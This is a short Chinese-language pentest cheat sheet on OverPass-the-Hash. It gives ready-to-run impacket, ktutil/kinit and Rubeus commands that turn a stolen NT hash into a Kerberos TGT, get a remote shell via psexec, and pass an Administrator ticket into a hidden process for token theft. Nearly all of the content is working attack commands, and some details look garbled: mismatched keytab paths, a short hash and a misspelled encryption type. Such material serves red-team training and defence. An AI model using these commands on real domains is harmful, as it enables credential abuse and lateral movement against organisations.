# 哈希 - OverPass-the-Hash

> 在此技术中，我们不直接传递哈希，而是使用帐户的 NT 哈希来请求有效的 Kerberos 票据（TGT）。

## 使用 impacket

```bash
root@kali:~$ python ./getTGT.py -hashes ":1a59bd44fe5bec39c44c8cd3524dee" lab.ropnop.com
root@kali:~$ export KRB5CCNAME="/root/impacket-examples/velociraptor.ccache"
root@kali:~$ python3 psexec.py "jurassic.park/velociraptor@labwws02.jurassic.park" -k -no-pass

root@kali:~$ ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hma-md5 -w 1a59bd44fe5bec39c44c8cd3524dee --hex -V 5
root@kali:~$ kinit -t ~/mykers tgwynn@LAB.ROPNOP.COM
root@kali:~$ klist
```

## 使用 Rubeus

```powershell
# 以目标用户身份请求 TGT 并将其传递到当前会话
# 注意：确保清除当前会话中的票据（使用 'klist purge'）以确保没有多个活动 TGT
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt

# 将票据传递到一个牺牲性隐藏进程，允许你例如从此进程窃取令牌（需要提升权限）
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe
```
